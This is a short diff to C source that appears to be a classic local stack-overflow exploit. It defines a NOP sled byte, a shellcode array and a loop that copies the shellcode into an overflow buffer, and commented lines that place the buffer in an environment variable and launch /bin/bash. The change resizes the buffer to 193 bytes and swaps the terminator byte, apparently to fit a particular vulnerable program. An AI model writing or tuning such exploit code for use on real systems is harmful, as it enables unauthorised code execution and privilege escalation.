@@ -5,7 +5,7 @@
 #include <stdlib.h>
 
 #define DEFAULT_OFFSET                    0
-#define DEFAULT_BUFFER_SIZE           20000
+#define DEFAULT_BUFFER_SIZE             193
 #define NOP                            0x90
 
 char shellcode[] =
@@ -46,9 +46,8 @@ void main(int argc, char *argv[]) {
   for (i = 0; i < strlen(shellcode); i++)
     *(ptr++) = shellcode[i];
 
-  buff[bsize - 1] = '\0';
+  buff[bsize - 1] = 0x5c;
 
-  printf(buff);
   // memcpy(buff,"EGG=",4);
   // putenv(buff);
   // system("/bin/bash");
